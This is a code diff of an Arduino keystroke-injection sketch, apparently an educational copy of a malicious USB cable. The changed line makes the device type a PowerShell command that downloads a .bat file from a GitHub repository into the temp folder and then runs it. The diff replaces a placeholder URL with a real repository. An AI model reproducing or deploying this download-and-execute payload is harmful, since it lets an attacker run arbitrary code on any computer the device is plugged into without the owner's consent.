@@ -11,7 +11,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(500);
 
-  String command = "cmd /c powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tuo-utente/tuo-repo/main/demo.bat' -OutFile '%TEMP%\\demo.bat'\"; start '%TEMP%\\demo.bat'";
+  String command = "cmd /c powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/valerio-buonarroti/arduino-cavo-omg-educativo/refs/heads/main/file-bat-demo.bat' -OutFile '%TEMP%\\demo.bat'\"; start '%TEMP%\\demo.bat'";
   
   Keyboard.print(command);
   delay(200);
